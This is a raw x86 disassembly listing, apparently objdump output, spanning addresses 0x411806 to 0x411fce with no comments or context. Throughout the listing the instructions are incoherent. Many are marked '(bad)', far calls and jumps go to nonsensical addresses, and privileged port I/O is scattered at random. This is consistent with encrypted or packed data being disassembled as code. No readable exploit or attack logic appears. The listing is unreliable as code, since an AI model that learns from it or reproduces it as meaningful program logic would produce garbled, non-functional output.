  411806:	fistp  QWORD PTR ds:[esi+0x6802aa38]
  41180d:	ficomp DWORD PTR [ecx-0x13fe3b1b]
  411813:	retf   
  411814:	sbb    al,0x60
  411816:	fcomp  DWORD PTR [esp+edx*8-0x56]
  41181a:	push   ebp
  41181b:	mov    eax,0x649baa60
  411820:	mov    ah,0xbc
  411822:	adc    BYTE PTR [edx+ebp*1-0x2d],0x4
  411827:	out    dx,eax
  411828:	xchg   ecx,eax
  411829:	pop    ds
  41182a:	pop    ecx
  41182b:	mov    edx,0xc6b17638
  411830:	lds    edi,FWORD PTR [esi]
  411832:	add    al,0xd3
  411834:	mov    esp,ebx
  411836:	aam    0xde
  411838:	fisttp WORD PTR [ecx+0x1477e840]
  41183e:	mov    ch,0xb7
  411840:	mov    cl,0xee
  411842:	arpl   WORD PTR [esi+0x6],bx
  411845:	(bad)  
  411846:	std    
  411847:	lds    edi,FWORD PTR [esi-0x3d]
  41184a:	shl    DWORD PTR [edi],cl
  41184c:	inc    edi
  41184d:	rcl    DWORD PTR [edi+ecx*2+0x43425aa0],0x41
  411855:	gs and eax,0xbd04f04c
  41185b:	sub    DWORD PTR [eax+0x7af1f96],ebx
  411861:	jg     0x41180b
  411863:	mov    ch,BYTE PTR [esi]
  411865:	jne    0x4118a5
  411867:	test   al,0x34
  411869:	iret   
  41186a:	push   ecx
  41186b:	lea    esi,[eax+0x2d]
  41186e:	dec    ecx
  41186f:	xchg   esi,eax
  411870:	mov    ds:0x3c81535f,al
  411875:	popf   
  411876:	or     BYTE PTR [ebx],dl
  411878:	clc    
  411879:	sbb    ch,cl
  41187b:	mov    edx,ss
  41187d:	push   0x3e2de904
  411882:	mov    ebp,0x1a734244
  411887:	sub    eax,0xdf1cfe71
  41188c:	rol    esp,1
  41188e:	test   BYTE PTR [edx+0x53],al
  411891:	ds das 
  411893:	(bad)  
  411894:	ins    BYTE PTR es:[edi],dx
  411895:	btr    DWORD PTR [ecx+edi*4-0x25],ecx
  41189a:	jge    0x41191a
  41189c:	mov    ebp,DWORD PTR [ecx]
  41189e:	push   cs
  41189f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a0:	in     al,dx
  4118a1:	dec    ebx
  4118a2:	mov    ds:0x194a10c7,eax
  4118a7:	sbb    BYTE PTR [edx+edi*4],ch
  4118aa:	in     al,0xbb
  4118ac:	xor    eax,0xb92d5db3
  4118b1:	(bad)  
  4118b2:	adc    dl,ch
  4118b4:	jae    0x41188f
  4118b6:	jnp    0x4118bf
  4118b8:	call   0x1f125f87
  4118bd:	adc    edx,DWORD PTR [edi-0x592513ad]
  4118c3:	mov    ah,0x9f
  4118c5:	mov    al,ds:0xfedf1fb
  4118ca:	repnz out dx,eax
  4118cc:	mov    edx,eax
  4118ce:	retf   0x7255
  4118d1:	loop   0x411872
  4118d3:	cdq    
  4118d4:	jmp    0xa0c16a78
  4118d9:	mov    edi,0x258033ef
  4118de:	ins    DWORD PTR es:[edi],dx
  4118df:	dec    edi
  4118e0:	cld    
  4118e1:	mov    esp,0x55ad61ba
  4118e6:	call   0x6269:0x34530c8
  4118ed:	aas    
  4118ee:	fld    TBYTE PTR [ebx+0x8]
  4118f1:	and    DWORD PTR [ebx-0x6bfb8820],ebx
  4118f7:	retf   
  4118f8:	or     DWORD PTR [edi],esp
  4118fa:	pop    edx
  4118fb:	and    eax,0xb3f99f58
  411900:	ror    DWORD PTR [eax],0x93
  411903:	mov    edi,DWORD PTR [eax-0x6e]
  411906:	jo     0x4118cc
  411908:	lods   eax,DWORD PTR ds:[esi]
  411909:	call   0xe557:0xd2bcd47f
  411910:	jecxz  0x411917
  411912:	and    BYTE PTR [edx-0x2f],ah
  411915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411916:	mov    dh,0xb9
  411918:	enter  0x202a,0x6a
  41191c:	stos   DWORD PTR es:[edi],eax
  41191d:	or     al,0xf1
  41191f:	imul   esi,DWORD PTR [edi-0x66d3b99f],0x50ffe25b
  411929:	push   ecx
  41192a:	(bad)  
  41192c:	sub    ebx,DWORD PTR [ecx+0x74]
  41192f:	sub    eax,0x9e36a8fb
  411934:	adc    BYTE PTR [ebp-0x11],bl
  411937:	mov    dh,0xdb
  411939:	xor    al,0xe8
  41193b:	sub    cl,BYTE PTR [edx+0x27]
  41193e:	adc    eax,0x127cd1d7
  411943:	lahf   
  411944:	sbb    bh,dh
  411946:	rep outs dx,BYTE PTR ds:[esi]
  411948:	jg     0x4118e0
  41194a:	mov    esp,0x1c6fe428
  41194f:	push   eax
  411950:	test   edi,ebp
  411952:	popa   
  411953:	push   ds
  411954:	cmp    ebp,DWORD PTR [esi]
  411956:	(bad)  
  411957:	push   ecx
  411958:	loope  0x411964
  41195a:	mov    DWORD PTR [ecx],esp
  41195c:	jmp    0x3f59:0xdd26e28
  411963:	push   ecx
  411964:	cmp    edx,DWORD PTR [edx]
  411966:	fsub   st(0),st
  411968:	add    DWORD PTR [ebp+0x6ec98d15],eax
  41196e:	xlat   BYTE PTR ds:[ebx]
  41196f:	mov    ah,0x56
  411971:	pop    ss
  411972:	xchg   ebx,eax
  411973:	daa    
  411974:	outs   dx,BYTE PTR ds:[esi]
  411975:	ret    
  411976:	xlat   BYTE PTR ds:[ebx]
  411977:	push   es
  411978:	loope  0x411994
  41197a:	add    al,0xfb
  41197c:	sbb    eax,0x910adac6
  411981:	enter  0xab0,0x4c
  411985:	mov    ds:0xf77885d4,al
  41198a:	ror    dh,cl
  41198c:	cmp    al,0x29
  41198e:	xchg   esp,eax
  41198f:	cmp    BYTE PTR [esi+0x6d],0x9e
  411993:	and    al,0x9d
  411995:	lods   al,BYTE PTR ds:[esi]
  411996:	stos   BYTE PTR es:[edi],al
  411997:	in     al,dx
  411998:	bound  ecx,QWORD PTR [edx+0x7fc9d4a0]
  41199e:	pop    esp
  41199f:	cmp    ch,0x5f
  4119a2:	xlat   BYTE PTR ds:[ebx]
  4119a3:	fsub   QWORD PTR [ecx-0x7b68e63d]
  4119a9:	add    DWORD PTR [edx+0x545eb019],ebx
  4119af:	push   ecx
  4119b0:	test   DWORD PTR [esi-0x72],ecx
  4119b3:	push   cs
  4119b4:	add    al,0x80
  4119b6:	pusha  
  4119b7:	add    al,0x3b
  4119b9:	ja     0x411a06
  4119bb:	pushf  
  4119bc:	add    esi,DWORD PTR [edi]
  4119be:	jp     0x4119b9
  4119c0:	push   eax
  4119c1:	lds    esp,FWORD PTR [edx]
  4119c3:	add    al,0x53
  4119c5:	stc    
  4119c6:	push   esi
  4119c7:	push   ss
  4119c8:	mov    ah,0xb7
  4119ca:	dec    esi
  4119cb:	aas    
  4119cc:	mov    ah,0xbb
  4119ce:	dec    eax
  4119cf:	fs pop ds
  4119d1:	retf   0xf2f8
  4119d4:	jecxz  0x4119aa
  4119d6:	out    0x61,eax
  4119d8:	ffreep st(4)
  4119da:	(bad)  
  4119db:	ss repz jbe 0x41199c
  4119df:	fistp  DWORD PTR [ecx]
  4119e1:	ret    0xc82c
  4119e4:	mov    bh,0xa
  4119e6:	push   ebx
  4119e7:	or     al,0x79
  4119e9:	xchg   edx,eax
  4119ea:	cmp    DWORD PTR [edx],0x9cdfea53
  4119f0:	mov    eax,ds:0x86c98a35
  4119f5:	mov    cl,0x57
  4119f7:	or     ah,0xe4
  4119fa:	js     0x411a40
  4119fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119fd:	call   0x9163:0x65f1b61a
  411a04:	(bad)  [edx]
  411a06:	mov    ebp,DWORD PTR [ecx-0x65814207]
  411a0c:	mov    BYTE PTR [esi+ebx*1],al
  411a0f:	popa   
  411a10:	gs or  ch,al
  411a13:	xor    BYTE PTR [ecx-0x44],al
  411a16:	and    edi,DWORD PTR [ecx]
  411a18:	xor    al,0x43
  411a1a:	push   ebx
  411a1b:	sbb    DWORD PTR [ebp+0x1fce05c7],esi
  411a21:	dec    edi
  411a22:	jb     0x411a58
  411a24:	scas   al,BYTE PTR es:[edi]
  411a25:	mov    edx,0x34d1a7ea
  411a2a:	jp     0x411a26
  411a2c:	jl     0x4119c8
  411a2e:	dec    esp
  411a2f:	and    BYTE PTR [ebx+0x6f7be17f],bl
  411a35:	or     al,0xf
  411a37:	xor    esp,DWORD PTR [edx+eax*4-0x31]
  411a3b:	test   al,0xde
  411a3d:	popa   
  411a3e:	xchg   DWORD PTR [edx-0x46],ebp
  411a41:	ret    0x59f2
  411a44:	test   BYTE PTR [edx],dh
  411a46:	jmp    0xdf65:0xc83080d
  411a4d:	imul   ebp,ecx,0x65
  411a50:	mov    eax,ds:0x53f7b95e
  411a55:	pop    ebx
  411a56:	and    dl,BYTE PTR [ecx]
  411a58:	cmp    BYTE PTR [edi+0x1f],ah
  411a5b:	stos   BYTE PTR es:[edi],al
  411a5c:	stos   DWORD PTR es:[edi],eax
  411a5d:	gs test esp,edx
  411a60:	xchg   bl,al
  411a62:	daa    
  411a63:	enter  0xb5fa,0xb7
  411a67:	(bad)  
  411a68:	div    dh
  411a6a:	aad    0x9b
  411a6c:	icebp  
  411a6d:	or     DWORD PTR [edi+0x46],edx
  411a70:	adc    al,0x6d
  411a72:	push   ss
  411a73:	sub    ah,BYTE PTR [eax+ecx*2+0x62214733]
  411a7a:	pop    ebx
  411a7b:	mov    eax,ds:0xc0415baf
  411a80:	xchg   edx,eax
  411a81:	cmp    ebx,DWORD PTR ds:0x2fe85f45
  411a87:	mov    cl,0xb4
  411a89:	mov    esi,0x1281fa9b
  411a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a8f:	gs jp  0x411ae1
  411a92:	sub    dh,BYTE PTR ds:0x8a8df95
  411a98:	out    dx,eax
  411a99:	cwde   
  411a9a:	call   0x5dc9b933
  411a9f:	mov    ebp,DWORD PTR [eax]
  411aa1:	xchg   eax,ebx
  411aa3:	jge    0x411a51
  411aa5:	sbb    esi,DWORD PTR [edi+0x52]
  411aa8:	jmp    0x52e09fea
  411aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aae:	test   BYTE PTR [eax+0x45],dh
  411ab1:	fs push esi
  411ab3:	mov    ds:0x79dc2153,eax
  411ab8:	std    
  411ab9:	mov    edi,0xe97dfb44
  411abe:	jle    0x411b31
  411ac0:	push   eax
  411ac1:	mov    edi,0xd189e920
  411ac6:	sub    al,0xdb
  411ac8:	or     al,0x1e
  411aca:	push   ebp
  411acb:	aam    0xe5
  411acd:	mov    ecx,0x8f152ef9
  411ad2:	sub    bh,BYTE PTR [ecx-0x64b9b6d3]
  411ad8:	and    edi,DWORD PTR [esi]
  411ada:	fimul  DWORD PTR [esi+0x22]
  411add:	pop    esi
  411ade:	mov    ds:0xb39e6d95,al
  411ae3:	ficom  WORD PTR [edi-0x38]
  411ae6:	sbb    BYTE PTR [edx-0x609d7dbe],al
  411aec:	pushf  
  411aed:	loopne 0x411b57
  411aef:	cmp    eax,0x6723fc17
  411af4:	retf   0x1137
  411af7:	fdivr  DWORD PTR [ebp-0x5f297917]
  411afd:	push   edi
  411afe:	lods   eax,DWORD PTR ds:[esi]
  411aff:	cwde   
  411b00:	shr    dh,1
  411b02:	std    
  411b03:	lds    ebx,FWORD PTR [ebx+ebx*2+0x4d]
  411b07:	lds    ebp,FWORD PTR [edx+0x46b9a9f6]
  411b0d:	pushf  
  411b0e:	dec    bl
  411b10:	mov    eax,ds:0x25e5d70
  411b15:	pop    edi
  411b16:	ja     0x411b10
  411b18:	mov    ecx,0xd16b9900
  411b1d:	int3   
  411b1e:	sbb    al,0xe8
  411b20:	sbb    BYTE PTR [eax+0xb0eb20a],dl
  411b26:	sub    bh,BYTE PTR [ebp-0x16]
  411b29:	mov    eax,DWORD PTR [esi-0x494a55e0]
  411b2f:	xchg   edx,eax
  411b30:	rcr    DWORD PTR [edx-0x55],cl
  411b33:	xchg   ebp,eax
  411b34:	mov    ebx,0xe72e5dcc
  411b39:	push   edx
  411b3a:	pop    edx
  411b3b:	or     dl,dh
  411b3d:	add    al,0x6a
  411b3f:	hlt    
  411b40:	outs   dx,DWORD PTR ds:[esi]
  411b41:	dec    eax
  411b42:	ds aas 
  411b44:	and    DWORD PTR [edi],0xffffffb1
  411b47:	outs   dx,DWORD PTR ds:[esi]
  411b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b49:	jge    0x411b72
  411b4b:	retf   
  411b4c:	mov    ah,0x2b
  411b4e:	test   al,0x1d
  411b50:	or     al,0x6
  411b52:	iret   
  411b53:	pop    ecx
  411b54:	(bad)  
  411b55:	xchg   esp,eax
  411b56:	(bad)  
  411b57:	lods   al,BYTE PTR ds:[esi]
  411b58:	(bad)  
  411b5b:	adc    eax,0xcfb18c11
  411b60:	mov    ch,BYTE PTR ds:0x965d282f
  411b66:	xor    DWORD PTR [eax],eax
  411b68:	outs   dx,BYTE PTR ds:[esi]
  411b69:	lahf   
  411b6a:	pop    es
  411b6b:	xor    al,0x10
  411b6d:	retf   0x5fdf
  411b70:	(bad)  
  411b71:	retf   0x4944
  411b74:	jno    0x411bb9
  411b76:	adc    DWORD PTR [edx+ebp*4-0x339fc523],0x58b176c1
  411b81:	popf   
  411b82:	or     ch,BYTE PTR [eax-0x2d]
  411b85:	fmul   st,st(4)
  411b87:	lods   eax,DWORD PTR ds:[esi]
  411b88:	cdq    
  411b89:	pusha  
  411b8a:	dec    ebp
  411b8b:	mov    dl,0x4a
  411b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b8e:	pusha  
  411b8f:	pop    ecx
  411b90:	mov    esp,0xb90544da
  411b95:	mov    ds:0xd172cbf9,al
  411b9a:	and    esp,edi
  411b9c:	pop    ds
  411b9d:	adc    al,0x88
  411b9f:	ret    0x1dd2
  411ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba3:	mov    bh,0xe
  411ba5:	loop   0x411bab
  411ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba8:	adc    eax,0x239bffc0
  411bad:	dec    esi
  411bae:	pushf  
  411baf:	jg     0x411baa
  411bb1:	fisubr WORD PTR [edx-0x8]
  411bb4:	jo     0x411b8c
  411bb6:	and    DWORD PTR gs:[ebx+0x786ffc8],eax
  411bbd:	jne    0x411b61
  411bbf:	sub    ah,dh
  411bc1:	mov    bl,0x79
  411bc3:	add    ecx,ecx
  411bc5:	or     dh,BYTE PTR [eax-0x7f]
  411bc8:	stos   BYTE PTR es:[edi],al
  411bc9:	(bad)  
  411bca:	aaa    
  411bcb:	test   BYTE PTR [edi+0x5c5b0ca4],0x65
  411bd2:	adc    eax,0x26653b63
  411bd8:	mov    eax,DWORD PTR [ebx]
  411bda:	je     0x411bea
  411bdc:	or     al,0x6d
  411bde:	add    ebx,ebx
  411be0:	inc    esp
  411be1:	hlt    
  411be2:	sbb    eax,0xed1d09b4
  411be7:	out    dx,eax
  411be8:	nop
  411be9:	dec    ebx
  411bea:	retf   0x3f34
  411bed:	clc    
  411bee:	xchg   edi,eax
  411bef:	rol    DWORD PTR [ecx+0x216cb9ca],cl
  411bf5:	ins    DWORD PTR es:[edi],dx
  411bf6:	dec    ecx
  411bf7:	nop
  411bf8:	and    al,0x3
  411bfb:	jl     0x411c1d
  411bfd:	mov    bh,0x8a
  411bff:	shl    BYTE PTR ds:0xc61ee0f6,cl
  411c05:	(bad)  
  411c06:	lea    edx,[esi]
  411c08:	cmp    al,0xc2
  411c0a:	(bad)  
  411c0b:	mov    eax,0x94db45d7
  411c10:	and    al,BYTE PTR [esp+edi*8+0x1e4a6cf8]
  411c17:	jg     0x411bc0
  411c19:	push   ebp
  411c1a:	imul   esi,ebx,0x78f5d45a
  411c20:	dec    ebx
  411c21:	xor    al,0xa2
  411c23:	cld    
  411c24:	dec    edi
  411c25:	(bad)  
  411c28:	sahf   
  411c29:	and    DWORD PTR [esi],0x70cfcd1f
  411c2f:	enter  0xf160,0xe0
  411c33:	jne    0x411be0
  411c35:	jno    0x411ca3
  411c37:	adc    BYTE PTR [ebx+eiz*4-0x22],0x7c
  411c3c:	call   0x450dc7a8
  411c41:	cmp    DWORD PTR [ebp+0x1a],ebp
  411c44:	add    BYTE PTR ds:0x4b483e96,cl
  411c4a:	(bad)  
  411c4b:	push   ecx
  411c4c:	fsincos 
  411c4e:	out    0x30,eax
  411c50:	hlt    
  411c51:	(bad)
  411c54:	imul   DWORD PTR [edx+0x32]
  411c57:	add    dh,al
  411c59:	sub    DWORD PTR [ebx],0x4a
  411c5c:	sub    DWORD PTR [ecx+esi*1],ecx
  411c5f:	mov    edi,0xca6142f6
  411c64:	inc    edx
  411c65:	ror    BYTE PTR [eax-0x52],cl
  411c68:	xor    esi,ebp
  411c6a:	je     0x411c56
  411c6c:	dec    ebp
  411c6d:	jbe    0x411c01
  411c6f:	cli    
  411c70:	push   esp
  411c71:	push   0xc1b359af
  411c76:	sbb    bl,BYTE PTR [edi-0x4e6ad512]
  411c7c:	sbb    DWORD PTR ds:0x4216ecbd,ebp
  411c82:	jmp    0x411c1c
  411c84:	cli    
  411c85:	mov    bh,0xc8
  411c87:	out    dx,eax
  411c88:	push   esi
  411c89:	loopne 0x411c0e
  411c8b:	lahf   
  411c8c:	sahf   
  411c8d:	sbb    DWORD PTR [ecx],edx
  411c8f:	xlat   BYTE PTR ds:[ebx]
  411c90:	xchg   ecx,eax
  411c91:	adc    al,0x68
  411c93:	mov    bl,0x6f
  411c95:	xchg   esp,eax
  411c96:	lea    eax,[edi+edi*8]
  411c99:	mov    dl,0xf
  411c9b:	(bad)  
  411c9c:	push   ds
  411c9d:	sub    esp,edi
  411c9f:	sbb    BYTE PTR [eax-0x510746bf],bl
  411ca5:	data16 mov cl,0x8c
  411ca8:	das    
  411ca9:	in     al,0xbc
  411cab:	pop    es
  411cac:	jecxz  0x411c87
  411cae:	test   DWORD PTR [ecx+ecx*2],esi
  411cb1:	xchg   edx,eax
  411cb2:	lahf   
  411cb3:	ror    DWORD PTR [eax+0x6589dea9],0x97
  411cba:	dec    esp
  411cbb:	call   FWORD PTR [eax]
  411cbd:	ror    ecx,0x1e
  411cc0:	hlt    
  411cc1:	ins    BYTE PTR es:[edi],dx
  411cc2:	pop    edi
  411cc3:	cwde   
  411cc4:	dec    ecx
  411cc5:	jno    0x411c93
  411cc7:	pop    ds
  411cc8:	into   
  411cc9:	aad    0x92
  411ccb:	ror    DWORD PTR [edx+ecx*8],0x7a
  411ccf:	mov    edx,ebp
  411cd1:	xor    eax,0x7d789568
  411cd6:	cmp    al,0x23
  411cd8:	jmp    0xc2c44799
  411cdd:	sti    
  411cde:	jb     0x411d17
  411ce0:	sti    
  411ce1:	cmp    BYTE PTR [eax+edi*8-0x4b7d6456],bl
  411ce8:	fwait
  411ce9:	xchg   ebp,eax
  411cea:	mov    dh,0x65
  411cec:	xlat   BYTE PTR ds:[ebx]
  411ced:	or     DWORD PTR [ebx-0x5da57766],ebx
  411cf3:	loop   0x411d19
  411cf5:	ja     0x411cfe
  411cf7:	aaa    
  411cf8:	pop    ebp
  411cf9:	arpl   WORD PTR [esi+0x73151556],di
  411cff:	test   BYTE PTR [ebp+0x31],bh
  411d02:	mov    esp,0xf367494
  411d07:	adc    eax,0xfe9790a7
  411d0c:	sbb    al,BYTE PTR ds:0xe1c06d1a
  411d12:	pop    es
  411d13:	jge    0x411cb7
  411d15:	mov    ds:0xc0b75a5d,al
  411d1a:	rcr    al,cl
  411d1c:	mov    dl,0xf2
  411d1e:	test   al,0xb3
  411d20:	adc    DWORD PTR [edx],ebp
  411d22:	ds add bh,cl
  411d25:	or     bh,BYTE PTR [eax-0x4d533303]
  411d2b:	inc    esp
  411d2c:	dec    eax
  411d2d:	adc    BYTE PTR [esi+ebx*1+0x45],al
  411d31:	aam    0xbe
  411d33:	stc    
  411d34:	cmp    bh,BYTE PTR [edx]
  411d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d37:	push   esi
  411d38:	adc    DWORD PTR [edi+0x54c17fa0],0xfffffffe
  411d3f:	xchg   ebx,eax
  411d40:	in     eax,dx
  411d41:	fdiv   DWORD PTR [edi+eiz*8-0x73]
  411d45:	dec    edi
  411d46:	test   al,0xca
  411d48:	xchg   ecx,eax
  411d49:	adc    BYTE PTR [ebp-0x66e931f],0x5b
  411d50:	dec    eax
  411d51:	mov    WORD PTR [ebp+0x3c],gs
  411d54:	repnz mov ebx,0xbbed412e
  411d5a:	bound  ebx,QWORD PTR [ecx+0xed6726f]
  411d60:	jbe    0x411d90
  411d62:	pop    ds
  411d63:	pop    edi
  411d64:	pop    ecx
  411d65:	sub    eax,0xe6e7f3ab
  411d6a:	sbb    al,BYTE PTR [esi-0x5d]
  411d6d:	bound  ebx,QWORD PTR [esi+esi*8+0x6ea98019]
  411d74:	or     esi,DWORD PTR [ecx+edx*4]
  411d77:	out    dx,eax
  411d78:	(bad)  
  411d79:	xchg   edx,eax
  411d7a:	push   DWORD PTR [eax]
  411d7c:	inc    esi
  411d7d:	xor    edi,DWORD PTR [ebx]
  411d7f:	test   BYTE PTR ds:[ecx+0x3],cl
  411d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d84:	shl    BYTE PTR [eax+0x60],cl
  411d87:	loopne 0x411dc9
  411d89:	test   eax,0x9ac60cd3
  411d8e:	aad    0xcd
  411d90:	xor    al,0xf1
  411d92:	mov    al,ds:0x641e6577
  411d97:	ins    DWORD PTR es:[edi],dx
  411d98:	mov    BYTE PTR [ecx+ebx*4],bh
  411d9b:	push   ss
  411d9c:	js     0x411e1c
  411d9e:	aaa    
  411d9f:	mov    ch,0xd5
  411da1:	fs push ebp
  411da3:	out    dx,al
  411da4:	add    ch,dh
  411da6:	lahf   
  411da7:	aas    
  411da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411daa:	mov    ?,ebx
  411dac:	sbb    ah,ch
  411dae:	arpl   sp,cx
  411db0:	pop    ebp
  411db1:	sub    DWORD PTR [eax+0x487f04fe],0xffffff98
  411db8:	push   eax
  411db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dba:	add    eax,0x7d773317
  411dbf:	rcl    DWORD PTR ds:0xafd2a3a7,cl
  411dc5:	(bad)  
  411dc7:	and    al,0x37
  411dc9:	push   edx
  411dca:	(bad)  
  411dcb:	add    eax,0x7537444
  411dd0:	dec    edx
  411dd1:	mov    eax,gs
  411dd3:	lock (bad) 
  411dd5:	mov    ecx,0x5c5370ba
  411dda:	and    bl,dl
  411ddc:	mov    ecx,0xa6518807
  411de1:	xor    DWORD PTR [esi-0x173e81e5],edx
  411de7:	jno    0x411ddb
  411de9:	mov    ds:0x2dbb251b,al
  411dee:	sbb    BYTE PTR [esi-0x1dadaad2],al
  411df4:	fdiv   DWORD PTR gs:[ebp-0x7c1562e6]
  411dfb:	dec    esp
  411dfc:	inc    esi
  411dfd:	push   es
  411dfe:	es aam 0x32
  411e01:	sar    DWORD PTR [edi],cl
  411e03:	test   al,0xd2
  411e05:	dec    eax
  411e06:	cmc    
  411e07:	add    al,ah
  411e09:	js     0x411ddc
  411e0b:	add    bl,BYTE PTR [ebp-0x74]
  411e0e:	add    DWORD PTR [edx+0x3d],eax
  411e11:	std    
  411e12:	bound  esp,QWORD PTR [esi+edx*1-0x345c9b93]
  411e19:	jmp    0x60a24b74
  411e1e:	enter  0x668b,0x4
  411e22:	in     al,dx
  411e23:	sbb    al,0x9
  411e26:	pop    edx
  411e27:	mov    dl,0x56
  411e29:	adc    eax,0x3b06a90b
  411e2e:	push   eax
  411e2f:	add    DWORD PTR ds:0x68c233c1,0x925c31aa
  411e39:	repnz in al,0xc8
  411e3c:	call   0xb347ebf3
  411e41:	sbb    ah,BYTE PTR [ebx-0x78]
  411e44:	add    eax,0x85cdfaa8
  411e49:	and    bl,bh
  411e4b:	mov    BYTE PTR [ecx-0x1f436c65],ah
  411e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e52:	ds mov ebp,cs
  411e55:	jo     0x411ec0
  411e57:	repz cmp bh,BYTE PTR ds:0x5ec38c72
  411e5e:	fstp   DWORD PTR [eax+ebp*2-0x6d]
  411e62:	fxch   st(4)
  411e64:	pop    ebp
  411e65:	mov    edi,0xcd156990
  411e6a:	xchg   esi,eax
  411e6b:	add    ah,BYTE PTR [ecx]
  411e6d:	adc    ebx,ebx
  411e6f:	cmp    cl,BYTE PTR [edi-0x44]
  411e72:	dec    esi
  411e73:	into   
  411e74:	add    BYTE PTR [esi],ch
  411e76:	push   0xb27f110a
  411e7b:	mov    edi,0xa4f9c51f
  411e80:	loope  0x411eb9
  411e82:	and    esi,DWORD PTR ss:[edx]
  411e85:	sti    
  411e86:	jo     0x411e73
  411e88:	xchg   edi,eax
  411e89:	call   0x27f4:0xd6301273
  411e90:	and    ecx,DWORD PTR [edx]
  411e92:	sub    edi,ebp
  411e94:	(bad)  
  411e95:	fstp   QWORD PTR [eax+ebx*1]
  411e98:	push   eax
  411e99:	(bad)  [eax+0x2]
  411e9c:	fcom   st(0)
  411e9e:	aad    0xa9
  411ea0:	mov    al,0x66
  411ea2:	jae    0x411ed3
  411ea4:	xchg   BYTE PTR [ebp-0x21],al
  411ea7:	pop    esp
  411ea8:	mov    ecx,0xcbec48e7
  411ead:	mov    ebp,0x6252c088
  411eb2:	and    DWORD PTR [edi-0x2d78f33c],eax
  411eb8:	add    dl,cl
  411eba:	xchg   ebp,eax
  411ebb:	or     cl,cl
  411ebd:	scas   al,BYTE PTR es:[edi]
  411ebe:	(bad)  
  411ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ec0:	add    dh,BYTE PTR [ecx+0x78]
  411ec3:	xchg   ebp,eax
  411ec4:	xchg   bl,dh
  411ec6:	rep ins DWORD PTR es:[edi],dx
  411ec8:	adc    al,0x70
  411eca:	bound  edi,QWORD PTR [ecx-0x30]
  411ecd:	dec    edi
  411ece:	fldenv [ebp-0x2241149f]
  411ed4:	sub    bh,BYTE PTR [ecx+0x2cf5edaa]
  411eda:	test   al,0xa9
  411edc:	ins    DWORD PTR es:[edi],dx
  411edd:	mov    ebp,0x1af4254a
  411ee2:	push   ebp
  411ee3:	scas   al,BYTE PTR es:[edi]
  411ee4:	out    0x52,al
  411ee6:	fidivr DWORD PTR [eax+0x41]
  411ee9:	in     eax,dx
  411eea:	xchg   esi,eax
  411eeb:	push   edi
  411eec:	dec    ecx
  411eed:	test   DWORD PTR [edx+ecx*8-0x48a95831],edi
  411ef4:	std    
  411ef5:	repnz scas al,BYTE PTR es:[edi]
  411ef7:	lea    ecx,[esi]
  411ef9:	add    eax,0xa2a2edf6
  411efe:	inc    edx
  411eff:	cmp    BYTE PTR [bp+si],ah
  411f02:	es xchg edx,eax
  411f04:	xchg   esi,eax
  411f05:	xchg   edi,eax
  411f06:	sbb    eax,0x6dd8d885
  411f0b:	loop   0x411f89
  411f0d:	cmp    DWORD PTR [edi+ebx*2+0x7],0xdc3c4800
  411f15:	fs push 0xffffff9b
  411f18:	adc    edx,edi
  411f1a:	dec    ecx
  411f1b:	push   ebx
  411f1c:	lods   eax,DWORD PTR ds:[esi]
  411f1d:	(bad)
  411f20:	(bad)  
  411f21:	(bad)  
  411f22:	xchg   ebp,eax
  411f23:	dec    eax
  411f24:	(bad)  
  411f26:	mov    al,ds:0x41deee05
  411f2b:	push   ebx
  411f2c:	add    DWORD PTR [ebx-0x728f82fb],edx
  411f32:	xor    BYTE PTR [edx+ecx*4-0x2b],dl
  411f36:	cdq    
  411f37:	pcmpeqd mm1,QWORD PTR [edi+0x133f6463]
  411f3e:	xor    BYTE PTR [edx],0x7e
  411f41:	mov    ds,WORD PTR [edi+ebp*4+0x1f]
  411f45:	retf   0x36bd
  411f48:	mov    eax,ds:0x2934b04d
  411f4d:	pop    esi
  411f4e:	sub    al,0x75
  411f50:	(bad)  
  411f52:	sti    
  411f53:	in     al,dx
  411f54:	cmp    BYTE PTR [ebp-0x26ca1acc],al
  411f5a:	sbb    DWORD PTR [eax+eax*8-0x79e16cb9],0x3a55bf80
  411f65:	imul   DWORD PTR [ecx+0x5b]
  411f68:	or     DWORD PTR [ecx-0x19],ebp
  411f6b:	push   ss
  411f6c:	push   0x9bd2fb51
  411f71:	arpl   WORD PTR [eax-0x25],bx
  411f74:	add    BYTE PTR [edx-0x19],ch
  411f77:	out    0x24,al
  411f79:	ret    
  411f7a:	imul   esp,DWORD PTR [edi-0x24b501d4],0xffffffb2
  411f81:	mov    al,al
  411f83:	jmp    0x47a1:0x77acb8a8
  411f8a:	loope  0x411f48
  411f8c:	std    
  411f8d:	push   ecx
  411f8e:	rcr    eax,cl
  411f90:	sub    BYTE PTR [edx],dh
  411f92:	or     dh,BYTE PTR [edx-0x65]
  411f95:	aad    0x71
  411f97:	add    DWORD PTR [eax+0x22d15fe4],edx
  411f9d:	xchg   ecx,eax
  411f9e:	jns    0x411f63
  411fa0:	pop    ebx
  411fa1:	lea    ecx,[eax+0x5e]
  411fa4:	or     edi,eax
  411fa6:	les    eax,FWORD PTR [ebx-0x49]
  411fa9:	sahf   
  411faa:	into   
  411fab:	fcom   QWORD PTR ds:0x4c10fbb0
  411fb1:	xlat   BYTE PTR ds:[ebx]
  411fb2:	int    0x80
  411fb4:	(bad)  
  411fb5:	adc    eax,0xcdee1e2c
  411fba:	mov    edi,0x8d69f1c2
  411fbf:	cwde   
  411fc0:	jmp    0x411fc1
  411fc2:	jbe    0x411fec
  411fc4:	sub    DWORD PTR [edx-0x5e],esi
  411fc7:	xchg   ah,al
  411fc9:	jmp    0x7694ada0
  411fce:	pop    es
